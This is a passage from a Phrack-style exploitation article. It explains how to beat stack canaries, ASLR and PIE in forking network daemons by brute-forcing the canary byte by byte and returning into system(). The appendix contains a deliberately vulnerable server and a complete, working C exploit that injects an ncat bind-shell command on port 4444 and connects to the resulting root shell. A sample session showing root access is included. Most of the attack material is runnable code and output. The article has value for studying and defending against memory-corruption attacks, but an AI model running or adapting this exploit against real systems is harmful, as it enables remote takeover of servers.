+We can thus see that:
+
+    *) The cookie (0x8c261700) is at 0xbfa386ac.
+    *) The return address is 0x005cbec1
+    *) The argument of vuln_func() are (0xbfa386f4, 0x4 and 0x5f)
+
+There is a really nice way to take advantage of this situation. If we chose
+to return into the 'call vuln_func()' instruction then the arguments will 
+be reused and the function replayed which will generate the needed network
+flow to detect the right value of the base address. Here is the C code 
+building our payload:
+
+        addr_callvuln = P_REL_CALLVULN + (base_addr << 12);
+
+        *(buf_addr++) = canary; 
+        *(buf_addr++) = addr_callvuln;  // <-- dummy
+        *(buf_addr++) = addr_callvuln;  // <-- dummy
+        *(buf_addr++) = addr_callvuln;  // <-- dummy 
+        *(buf_addr++) = addr_callvuln;  // <-- ret-into-callvuln!
+
+Note: Overwriting the next 4 bytes (args) with addr_callvuln is also 
+possible. Depending on the situation (whether you have the binary or not), 
+it can be an option to help with the bruteforce.
+
+Returning-into-system
+---------------------
+
+Now the idea is to get the shell. Since we know the load address, the only
+thing that needs to be done is to call a function which will give us a 
+shell. Again this is very specific to the daemon that you need/want to 
+exploit but in this case, I exploited the use of system(). Indeed in the 
+code you can find:
+
+
+    c8d:       e8 d6 fb ff ff          call   868 <system@plt>
+
+     ^-------------------------------  cool offset
+
+One may object that there is also the system parameter to find but "args" 
+is on the stack and pointing to a user controlled buffer which means that 
+we can do a return-into-callsystem(args).
+
+Note: In this case we were lucky (it was not done on purpose!) but the 
+following situation could also have occurred:
+
+             int vuln_func(int fd, char *args, int ile);
+
+In this case, the layout would be...
+
+                               [   ....  ]
+                               [ old_ebp ]
+                               [ old_eip ]
+                               [   fd    ]
+                               [   args  ]
+                               [   ile   ]
+                               [   ....  ]
+
+This would make no difference as we could use a return-into-ret and 
+overwrite fd with callsystem. An other solution would be to deduce the 
+address of the system() entry in the PLT and to call it as its first 
+argument would be "args" (classical return-into-func).
+
+Note: It may happen in real life situation that you have no stack address
+at disposal. Thus there are 2 solutions:
+
+    *) You bruteforce this address. It's lame. But sometimes you have no
+       other options (like when the overflow is limited which restricts 
+       your ability to performed chained return-into-*.
+
+    *) You create a new stack frame somewhere in the .data section. Knowing
+       the loading address of the ELF object, it's easy to locate the .data
+       section. You would thus be able to create a whole fake stack frame 
+       using a chained return-into-read(fd, &newstack_in_data, len) and 
+       then finally switch the stack using a leave-ret sequence. Fun and 
+       100% cool.
+
+It that all? Not quite. We need to be sure that we will be able to reach 
+the 'ret' before crashing. Let's have a look at the epilogue of the 
+function:
+
+objdump --no-show-raw-insn -Mintel -d ./s 
+
+
+     fb1:       call   8f8 <memcpy@plt>     
+     fb6:       lea    eax,[ebp-0x70]               ; the overflow occurred
+     fb9:       mov    DWORD PTR [esp+0x4],eax
+     fbd:       lea    eax,[ebx-0x1bdf]
+     fc3:       mov    DWORD PTR [esp],eax
+     fc6:       call   10ca <stack_dump>
+     fcb:       mov    DWORD PTR [esp+0x8],0x1e
+     fd3:       lea    eax,[ebx-0x1bd8]
+     fd9:       mov    DWORD PTR [esp+0x4],eax
+     fdd:       mov    eax,DWORD PTR [ebp+0xc]      ; we control the fd
+     fe0:       mov    DWORD PTR [esp],eax
+     fe3:       call   878 <write@plt>
+     fe8:       mov    eax,0x1
+     fed:       jmp    10b0 <vuln_func+0x1b1>
+
+    [...]
+
+    10b0:       mov    edx,DWORD PTR [ebp-0xc]
+    10b3:       xor    edx,DWORD PTR gs:0x14
+    10ba:       je     10c1 <vuln_func+0x1c2>
+    10bc:       call   1280 <__stack_chk_fail_local>
+    10c1:       add    esp,0x94
+    10c7:       pop    ebx                          ; interesting
+    10c8:       pop    ebp
+    10c9:       ret    
+
+The deadlisting is quite straightforward. The only local variable that is
+trashed is the fd used by write(). Does it matter? No. In the worst case,
+the write() will return an EBADF error.
+
+What about the ebx register? Well as a matter of fact, it is important to
+restore its value since it's a PIE. Indeed ebx is used as a global address:
+
+    00000868 <system@plt>:
+     868:   jmp    DWORD PTR [ebx+0x20]  ; ebx is pointing on the PLT 
+                                         ; (.got.plt)
+     86e:   push   0x28
+     873:   jmp    808 <_init+0x30>
+
+It's no big deal since the address of the .got.plt section is exactly:
+load_addr + the memory offset (cf. readelf -S). Here is the final stack 
+frame:
+
+    *(buf_addr++) = 0x00000004;
+    *(buf_addr++) = (P_REL_GOT + (base_addr << 12));  // used by the GOT.
+    *(buf_addr++) = 0x41414141;
+    *(buf_addr++) = system_addr;
+                                      // <-- Here is the buffer address 
+
+
+When there is no system()
+-------------------------
+
+The previous situation was a bit optimistic. Indeed when system() is not
+used in the program, there is obviously no "call system" instruction (and
+no corresponding PLT entry either). But it's no big deal a 
+return-into-write-like() function is always possible as illustrated below:
+
+    *(buf_addr++) = 0x00000004;
+    *(buf_addr++) = (P_REL_GOT + (base_addr << 12));
+    *(buf_addr++) = 0x41414141;
+    *(buf_addr++) = write_addr;  // retun into call_write(fd, buf, count)
+    *(buf_addr++) = 0x00000004;  // fd
+    *(buf_addr++) = some_addr;   // buf
+    *(buf_addr++) = 0x00000005;  // count
+
+With such a primitive it's easy to info leak anything needed. This could
+allow you to perform a return-into-dl-resolve() as illustrated in [10]. The
+implementation of this technique with the PoC exploit is left as an 
+exercise for the reader.
+
+Final algorithm
+---------------
+
+So in the end the final algorithm is:
+
+1) Looking for the distance needed to reach the canary of the death
+2) Finding the value of this canary using a 'byte-by-byte' brute force 
+   method
+3) Using the value of this canary to legitimate overflows, we should start 
+   finding the code segment by returning in a function leaking information.
+4) Deducing everything needed using the load address
+5) Build a new chained return-into-* attack and get the shell! 
+
+And it should give you something like that:
+
+---------------------------------------------------------------------------
+[root@pi3-test phrack]# gcc s.c -o s -fpie -pie -fstack-protector-all
+[root@pi3-test phrack]# ./s
+start
+
+Launched into background (pid: 32145)
+
+[root@pi3-test phrack]#
+...
+...
+child 32106 terminated
+sh: vuln: nie znaleziono polecenia
+
+
+[pi3@pi3-test phrack]$ gcc moj.c -o moj
+[pi3@pi3-test phrack]$ ./moj -v 127.0.0.1
+
+        ...::: -=[ Bypassing pro-police PoC for server by Adam 'pi3 
+(pi3ki31ny)' Zabrocki ]=- :::...
+
+        [+] Trying to find the position of the canary...
+        [+] Found the canary! => offset = 101 (+11)
+        [+] Trying to find the canary...
+        [+] Found byte! => 0x8e
+        [+] Found byte! => 0x17
+        [+] Found byte! => 0xa4
+        [+] Found byte! => 0xd7
+        [+] Overwriting frame pointer (EBP?)...
+        [+] Overwriting instruction pointer (EIP?)...
+        [+] Starting bruteforce...
+        [+] Success! :) (0x110eee0a)
+                -> @call_write = 0x110eed6c
+                -> @call_system = 0x110eeb9b
+        [+] Trying ret-into-system...
+        [+] Connecting to bindshell...
+
+pi3 was here :-)
+Executing shell...
+
+uid=0(root) gid=0(root) 
+grupy=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+Linux pi3-test 2.6.32.13-grsec #1 SMP Thu May 13 17:07:21 CEST 2010 i686 
+i686 i386 GNU/Linuxexit;
+---------------------------------------------------------------------------
+
+The demo exploit can be found in the appendix. It was tested on many 
+systems including:
+
+    *) Linux (Fedora 10, Fedora 11, Fedora 12)
+    *) Linux with PaX patch (2.6.32.13-grsec)
+    *) OpenBSD (4.4, 4.5, 4.6)
+    *) FreeBSD (7.x)
+
+
+---[ 6 - Conclusion
+
+Due to modern protections, classical methods of exploitation may or may not
+be sufficient to exploit remote stack overflows. We saw that in the context
+of fork()-only daemons a few conditions were sometimes sufficient for that 
+purpose.
+
+At this moment I want to send some greetings... I know it is lame and
+unprofessional ;)
+
+ -> Ewa - moja kochana dziewczyna ;)
+ -> Akos Frohner, Tomasz Janiczek, Romain Wartel - you are good friends ;)
+ -> snoop, phunk, thorkill, Piotr Bania, Gynvael Coldwind, andrewg, and 
+    #plhack@IRCNET
+
+"... opetani samotnoscia..."
+
+Best regards Adam Zabrocki. - "Ja tylko sprzatam..."
+
+
+---[ 7 - References
+
+ [1] http://phrack.org/issues.html?issue=56&id=5#article
+ [2] The Shellcoder's Handbook - Chris Anley, John Heasman, 
+     Felix "FX" Linder, Gerardo Richarte
+ [4] http://marc.info?m=97288542204811
+ [5] http://pax.grsecurity.net
+ [6] http://www.trl.ibm.com/projects/security/ssp/
+ [7] http://gcc.gnu.org/gcc-4.1/changes.html
+ [8] http://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
+ [9] http://sota.gen.nz/hawkes_openbsd.pdf
+[10] http://www.phrack.org/issues.html?issue=58&id=4
+[11] http://seclists.org/bugtraq/1997/Aug/63
+[12] http://phrack.org/issues.html?issue=59&id=9#article
+[13] http://www.phrack.org/issues.html?issue=63&id=14
+
+---[ 8 - Appendix - PoC
+
+
+---[ 8.1 - The server (s.c)
+
+----------------------------------- CUT -----------------------------------
+/*
+ * This is simple server which is vulnerable to stack overflow attack.
+ * It was written for demonstration of the remote stack overflow attack in 
+ * modern *NIX systems - bypass everything - ASLR, AAAS, ESP, SSP 
+ * (ProPolice).
+ *
+ * Best regards,
+ * Adam Zabrocki
+ * --
+ * pi3 (pi3ki31ny) - pi3 (at) itsec pl
+ * http://pi3.com.pl
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#define PORT 666
+#define PIDFILE "/var/run/vuln_server.pid"
+#define err_sys(a) {printf("%s[%s]\n",a,strerror(errno));exit(-1);}
+#define SA struct sockaddr
+
+#define SRV_BANNER "Some server launched by root user\n"
+
+int vuln_func(char *, int, int);
+void stack_dump(char *, char *);
+void sig_chld(int);
+
+int main(void) 
+{
+
+    int status,dlugosc,port=PORT,connfd,listenfd,kupa;
+    struct sockaddr_in serv,client;
+    char buf[200];
+    pid_t pid;
+    FILE *logs;
+
+    if ( (listenfd=socket(PF_INET, SOCK_STREAM, 0)) < 0)
+        err_sys("Socket() error!\n");
+
+    bzero(&serv,sizeof(serv));
+    bzero(&client,sizeof(client));
+    serv.sin_family = PF_INET;
+    serv.sin_port = htons(port);
+    serv.sin_addr.s_addr=htonl(INADDR_ANY);
+
+    if ( (bind(listenfd,(SA*)&serv,sizeof(serv))) != 0 )
+        err_sys("Bind() error!\n");
+
+    if ((listen(listenfd,2049)) != 0)
+        err_sys("Listen() error!\n");
+
+    system("echo start");
+    status=fork();
+    if (status==-1) err_sys("[FATAL]: cannot fork!\n");
+    if (status!=0) {
+        logs=fopen(PIDFILE, "w");
+        fprintf(logs,"pid = %u",status);
+        printf("\nLaunched into background (pid: %d)\n\n", status);
+        fclose(logs);
+        logs=NULL;
+        return 0;
+    }
+
+    status=0;
+    signal (SIGCHLD,sig_chld);
+
+    for (;;) {
+        
+        dlugosc = sizeof client;
+
+        if((connfd=accept(listenfd,(SA*)&client,(socklen_t *)&dlugosc))< 0)
+            err_sys("accept error !\n");
+
+        if ( (pid=fork()) == 0) {
+
+            if ( close(listenfd) !=0 )
+                err_sys("close error !\n");
+
+            write(connfd, SRV_BANNER, strlen(SRV_BANNER));
+
+            for (;;) {
+                bzero(buf,sizeof(buf));
+                kupa = recv(connfd, buf, sizeof(buf), 0);
+                if ( (vuln_func(buf,connfd, kupa)) != 1)
+                    break;
+            }
+            
+            close(connfd);
+            exit(0);
+        }
+        else
+            close(connfd);        
+    }
+}
+
+int vuln_func(char *args, int fd, int ile) {
+
+    char buf[100];
+    memset(buf, 0, sizeof buf);
+
+    if ( (strncmp(args,"vuln",4)) == 0) {
+#ifdef __DEBUG
+        stack_dump("BEFORE", buf);
+#endif
+        write(fd,"Vuln running...\nCopying bytes...",32);
+        memcpy(buf,args+5,ile-5);
+#ifdef __DEBUG
+        stack_dump("AFTER", buf);
+#endif
+        write(fd,"\nDONE\nReturn to the main loop\n",30);
+        return 1;
+    }
+
+    else if ( (strncmp(args,"quit",4)) == 0) {
+        write(fd,"Exiting...\n",11);
+        return 0;
+    }
+
+    else {
+        write(fd,"help:\n",6);
+        write(fd," [*] vuln <args>\n",17);
+        write(fd," [*] help\n",10);
+        write(fd," [*] quit\n",10);
+        return 1;
+    }
+}
+
+void stack_dump(char *header, char *buf)
+{
+    int i;
+    unsigned int *p = (unsigned int *)buf;
+    FILE *fp;
+
+    fp=fopen("./dupa.txt","a");
+    fprintf(fp,"%s\n",header);
+
+    for (i=0;i<240;)
+    {
+        fprintf(fp,"%.8x: %.8x %.8x %.8x %.8x\n", (unsigned int)p, 
+        *p, *(p+1), *(p+2), *(p+3));
+        p += 4;
+        i += sizeof(int) *4;
+    }
+    fprintf(fp,"\n");
+    fclose(fp);
+    return;
+}
+
+void sig_chld(int signo) 
+{
+
+    pid_t pid;
+    int stat;
+
+    while ( (pid = waitpid(-1, &stat, WNOHANG)) > 0)
+        printf("child %d terminated\n",pid);
+    return;
+}
+----------------------------------- CUT -----------------------------------
+
+---[ 8.2 - The exploit (moj.c)
+
+----------------------------------- CUT -----------------------------------
+/*
+ * This is Proof of Concept exploit which bypass everything (SSP 
+ * [pro-police], ASLR, AAAS, ESP) and use modified ret-into-libc technique 
+ * to execute shell.
+ *
+ * Article about modified ret-into-libc technique you can find on my web - 
+ * it was published some years ago on bugtraq and now it is very useful :)
+ *
+ * Ps. Address of ret-to-call_system@plt that you should change is
+ *     P_REL_CALLSYSTEM
+ *     The same you be done with directive P_REL_CALLVULN and P_REL_GOT. 
+ *     P_REL_CALLWRITE (info leak) is unused in this version of PoC.
+ *     P_CMD holds the command which will be executed - you can change if 
+ *     you want ;)
+ *
+ * Best regards,
+ * Adam Zabrocki
+ * --
+ * pi3 (pi3ki31ny) - pi3 (at) itsec pl
+ * http://pi3.com.pl
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <getopt.h>
+#include <errno.h>
+
+#define PORT 666
+#define BUFS 250
+#define START 90
+
+#define P_REL_CALLVULN      0xe0a
+#define P_REL_CALLWRITE     0xd6c
+#define P_REL_CALLSYSTEM    0xb9b
+#define P_REL_MASK          0x0FFF
+#define P_REL_GOT           0x25a4 // 0x2644
+
+#define SA struct sockaddr
+
+/* Thic CMD variable is only for PoC. You should choose it individually */
+//#define P_CMD "|| nc -l -p 4444 -e /bin/sh;"
+#define P_CMD "|| ncat -l -p 4444 -e /bin/sh;"
+
+int shell(int);
+
+int usage(char *arg) 
+{
+    printf("\n\t...::: -=[ Bypassing pro-police for PoC server by Adam "
+           "'pi3 (pi3ki31ny)' Zabrocki ]=- :::...\n");
+    printf("\n\tUsage:\n\t[+] %s [options]\n",arg);
+    printf("         -? <this help screen>\n");
+    printf("         -b <local_buff_brute_force_start_address>\n");
+    printf("         -p port\n");
+    printf("         -v <victim>\n\n");
+    exit(-1);
+}
+
+int main(int argc, char *argv[]) 
+{
+unsigned int brute = 0;
+
+    int ret, *buf_addr, global_cnt = 0;
+    char *buf,read_buf[4096],cannary[0x4] = { 0x0, 0x0, 0x0, 0x0 };
+    struct sockaddr_in servaddr;
+    struct hostent *h;
+    int elo, port=PORT, opt, sockfd, test=0, offset=0, test2 = 0;
+    int helper = 0, position_found = 0;
+    int write_addr = 0, system_addr = 0;
+
+    struct timeval tv;
+
+    while((opt = getopt(argc,argv,"p:b:v:?")) != -1) {
+        switch(opt) {
+            case 'b':
+                sscanf(optarg,"%x",&brute);
+                break;
+
+            case 'p':
+                port=atoi(optarg);
+                break;
+
+            case 'v':
+                test=1;
+                if ( (h=gethostbyname(optarg)) == NULL) {
+                    printf("gethostbyname() failed!\n");
+                    exit(-1);
+                }
+                break;
+
+            case '?':
+            default:
+                usage(argv[0]);
+            }
+    }
+
+    if (test==0)
+        usage(argv[0]);
+
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_port = htons(port);
+    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    servaddr.sin_addr = *(struct in_addr*)*h->h_addr_list;
+
+    if (!(buf=(char*)malloc(BUFS))) {
+        exit(-1);
+    }
+
+    setbuf(stdout,NULL);
+    printf("\n\t...::: -=[ Bypassing pro-police PoC for server by Adam "
+           "'pi3 (pi3ki31ny)' Zabrocki ]=- :::...\n");
+    printf("\n\t[+] Trying to find the position of the canary...\n");
+
+
+    for (position_found=0;!position_found;global_cnt++) {
+
+        memset(buf,0x0,BUFS);
+        strcpy(buf,"vuln ");
+
+        memset(&buf[5], 0x41, START+global_cnt);
+
+        if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
+            printf("Socket() error!\n");
+            exit(-1);
+        }
+
+        if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr))) < 0) {
+            printf("Connect() error!\n");
+            exit(-1);
+        }
+/*
+        // You can optimize waiting via timeout
+        tv.tv_sec=0,tv.tv_usec=40000;
+        if ( (setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv))) 
+           != 0) {
+            printf("setsockopt() error!\n");
+            exit(-1);
+        }
+*/
+        bzero(read_buf,sizeof(read_buf));
+        read(sockfd,read_buf,sizeof(read_buf));
+
+        write(sockfd,buf,strlen(buf));
+
+        bzero(read_buf,sizeof(read_buf));
+        read(sockfd,read_buf,32);
+        bzero(read_buf,sizeof(read_buf));
+        read(sockfd,read_buf,30);
+
+        write(sockfd,"quit",4);
+
+        bzero(read_buf,sizeof(read_buf));
+        ret = read(sockfd,read_buf,sizeof(read_buf));
+
+        if(ret <= 0) {
+            printf("\t[+] Found the canary! => offset = %d (+%d)\n",
+                    START+global_cnt,global_cnt);
+            position_found = 1;
+        }
+        close(sockfd);
+    }
+
+    printf("\t[+] Trying to find the canary...\n");
+
+    global_cnt--;
+    for (elo=0;elo<4;elo++) {
+        for (opt=0; opt<256; opt++) {
+
+
+
+            memset(buf,0x0,BUFS);
+            strcpy(buf,"vuln ");
+
+            memset(&buf[5], 0x41, START+global_cnt);
+            memcpy(&buf[5+START+global_cnt-1], cannary, elo);
+            buf[5+START+global_cnt-1+elo]=opt;
+
+            if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
+                printf("socket() error!\n");
+                exit(-1);
+            }
+
+            if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr)) ) < 0) {
+                printf("connect() error!\n");
+                exit(-1);
+            }
+/*
+            // You can optimize waiting via timeout
+            tv.tv_sec=0,tv.tv_usec=40000;
+            if ( (setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv)))
+               != 0) {
+                printf("setsockopt() error!\n");
+                exit(-1);
+            }
+*/
+            bzero(read_buf,sizeof(read_buf));
+            read(sockfd,read_buf,sizeof(read_buf));
+            do {
+                unsigned int an_egg = START+global_cnt+5+elo;
+                write(sockfd,buf,an_egg);
+            } while(0);
+
+            bzero(read_buf,sizeof(read_buf));
+            read(sockfd,read_buf,32);
+            bzero(read_buf,sizeof(read_buf));
+            read(sockfd,read_buf,30);
+
+            write(sockfd,"quit",4);
+
+            bzero(read_buf,sizeof(read_buf));
+            ret = read(sockfd,read_buf,sizeof(read_buf));
+
+            if (ret > 0) {
+                printf("\t[+] Found byte! => 0x%02x\n",opt);
+                cannary[elo] = opt;
+                close(sockfd);
+                break;
+            }
+            /* If we miss somehow the byte... */
+            if (opt == 255)
+               opt = 0x0;
+            close(sockfd);
+        }
+    }
+
+    printf("\t[+] Overwriting frame pointer (EBP?)...\n");
+    printf("\t[+] Overwriting instruction pointer (EIP?)...\n");
+    printf("\t[+] Starting bruteforce...\n");
+
+    for (offset=0,test2=0x0,opt=0;test&&!offset;test2++,opt++) {
+        memset(buf,0,BUFS);
+        strcpy(buf,"vuln ");
+
+        memset(&buf[5], 0x41, START+global_cnt);
+        memcpy(&buf[5+START+global_cnt-1], cannary, elo);
+
+        buf_addr=(int*)&buf[5+START+global_cnt-1+elo];
+        helper = (P_REL_CALLVULN & P_REL_MASK) | (test2 << 12);
+
+        *(buf_addr++) = 0xdeadbabe;
+        *(buf_addr++) = (P_REL_GOT + (test2 << 12));  // used by the GOT.
+        *(buf_addr++) = helper;
+
+        if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
+            printf("socket() error!\n");
+            exit(-1);
+        }
+
+        if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr))) < 0) {
+            printf("connect() error!\n");
+            exit(-1);
+        }
+/*
+        // You can optimize waiting via timeout
+        tv.tv_sec=0,tv.tv_usec=40000;
+        if ( (setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv))) 
+           != 0) {
+            printf("setsockopt() error!\n");
+            exit(-1);
+        }
+*/
+        bzero(read_buf,sizeof(read_buf));
+        read(sockfd,read_buf,sizeof(read_buf));
+
+        write(sockfd,buf,5+START+global_cnt-1+elo+(4-1)*4);
+
+        bzero(read_buf,sizeof(read_buf));
+        read(sockfd,read_buf,32);
+
+        bzero(read_buf,sizeof(read_buf));
+        read(sockfd,read_buf,30);
+
+        write(sockfd,"quit",4);
+
+        bzero(read_buf,sizeof(read_buf));
+        ret = read(sockfd,read_buf,sizeof(read_buf));
+
+        if(ret > 0) {
+
+            /* At that point we successfully called vuln_func()
+               which means that we "probably" returned in [I1]
+
+     e67:       8b 44 24 1c             mov    0x1c(%esp),%eax
+     e6b:       89 44 24 08             mov    %eax,0x8(%esp)
+     e6f:       8b 44 24 24             mov    0x24(%esp),%eax
+     e73:       89 44 24 04             mov    %eax,0x4(%esp)
+     e77:       8d 44 24 34             lea    0x34(%esp),%eax
+     e7b:       89 04 24                mov    %eax,(%esp)
+     e7e:       e8 3e 00 00 00          call   ec1 <vuln_func>   [I1]
+            */
+
+            write_addr = (P_REL_CALLWRITE & P_REL_MASK) | (test2 << 12);
+            system_addr = (P_REL_CALLSYSTEM & P_REL_MASK) | (test2 << 12);
+            printf("\t[+] Success! :) (0x%.8x)\n",helper);
+            printf("\t\t-> @call_write = 0x%.8x\n",write_addr);
+            printf("\t\t-> @call_system = 0x%.8x\n",system_addr);
+            offset=1;
+        }
+        close(sockfd);
+    }
+
+    if (!offset) {
+        printf("\t[-] Exploit Failed! :(\n\n");
+        exit(-1);
+    }
+
+    printf("\t[+] Trying ret-into-system...\n");
+
+    memset(buf,0x0,BUFS);
+    strcpy(buf,"vuln ");
+
+    memset(&buf[5], 0x41, START+global_cnt);
+    memcpy(&buf[5], P_CMD, strlen(P_CMD));
+
+    memcpy(&buf[5+START+global_cnt-1], cannary, elo);
+
+    buf_addr=(int*)&buf[5+START+global_cnt-1+elo];
+    test2--;
+
+    *(buf_addr++) = 0xdeadbabe;
+    *(buf_addr++) = (P_REL_GOT + (test2 << 12));  // used by the GOT.
+    *(buf_addr++) = 0x41414141;
+    *(buf_addr++) = system_addr;
+
+    if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
+        printf("Socket() error!\n");
+        exit(-1);
+    }
+
+    if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr))) < 0) {
+        printf("Connect() error!\n");
+        exit(-1);
+    }
+/*
+    // You can optimize waiting via timeout
+    tv.tv_sec=0,tv.tv_usec=40000;
+    if ( (setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv))) != 0) {
+        printf("setsockopt() error!\n");
+        exit(-1);
+    }
+*/
+    bzero(read_buf,sizeof(read_buf));
+    read(sockfd,read_buf,sizeof(read_buf));
+
+    write(sockfd,buf,4+START+global_cnt+4+4*4);
+ 
+    bzero(read_buf,sizeof(read_buf));
+    ret = read(sockfd,read_buf,32);
+
+    bzero(read_buf,sizeof(read_buf));
+    ret = read(sockfd,read_buf,30);
+
+    if(ret == 30) {
+        printf("\t[+] Connecting to bindshell...\n\n");
+
+        sleep(2);
+        if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
+            printf("Socket() error!\n");
+            exit(-1);
+        }
+        servaddr.sin_port = htons(4444);
+
+        if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr)) ) <0 ) {
+            printf("Connect() error!\n");
+            exit(-1);
+        }
+        shell(sockfd);
+    }
+
+    return 0;
+}
+
+int shell(int fd)
+{
+    int rd ;
+    fd_set rfds;
+    static char buff[1024];
+    char INIT_CMD[] = "echo \"pi3 was here :-)\"; "
+    "echo \"Executing shell...\"; "
+    "unset HISTFILE; echo; id; uname -a\n";
+
+    write(fd, INIT_CMD, strlen( INIT_CMD ));
+
+    while (1) {
+        FD_ZERO(&rfds);
+        FD_SET(0, &rfds);
+        FD_SET(fd, &rfds);
+
+        if (select(fd+1, &rfds, NULL, NULL, NULL) < 1) {
+            perror("[-] Select");
+            exit( EXIT_FAILURE );
+        }
+
+        if (FD_ISSET(0, &rfds)) {
+
+            if ( (rd = read(0, buff, sizeof(buff))) < 1) {
+               perror("[-] Read");
+               exit(EXIT_FAILURE);
+            }
+
+            if (write(fd,buff,rd) != rd) {
+               perror("[-] Write");
+               exit( EXIT_FAILURE );
+            }
+        }
+
+        if (FD_ISSET(fd, &rfds)) {
+            if ( (rd = read(fd, buff, sizeof(buff))) < 1) {
+               exit(EXIT_SUCCESS);
+            }
+            write(1, buff, rd);
+        }
+    }
+}
+----------------------------------- CUT -----------------------------------
